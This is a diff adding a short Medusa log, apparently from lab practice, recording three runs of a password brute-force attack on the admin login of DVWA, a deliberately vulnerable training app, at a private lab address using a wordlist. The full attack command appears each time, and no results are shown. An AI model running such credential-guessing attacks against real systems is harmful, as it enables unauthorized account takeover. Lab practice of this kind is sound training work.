@@ -1,0 +1,9 @@
+# Medusa v.2.3 (2026-11-24 14:53:27)
+# medusa -h 192.168.56.103 -u admin -P senhas.txt -M web-form -m FORM:/dvwa/login.php -m FORM-DATA:post?username=&password=&Login=Login -m DENY-SIGNAL:Login failed -O resultados-dvwa-medusa.txt 
+# Medusa has finished (2026-11-24 14:53:27).
+# Medusa v.2.3 (2026-11-24 15:08:29)
+# medusa -h 192.168.56.103 -u admin -P senhas.txt -M web-form -m FORM:/dvwa/login.php -m FORM-DATA:post?username=&password=&Login=Login -m DENY-SIGNAL:Login failed -O resultados-dvwa-medusa.txt 
+# Medusa has finished (2026-11-24 15:08:29).
+# Medusa v.2.3 (2026-11-24 15:08:46)
+# medusa -h 192.168.56.103 -u admin -P senhas.txt -M web-form -m FORM:/dvwa/login.php -m FORM-DATA:post?username=&password=&Login=Login -m DENY-SIGNAL:Login failed -O resultados-dvwa-medusa.txt 
+# Medusa has finished (2026-11-24 15:08:46).
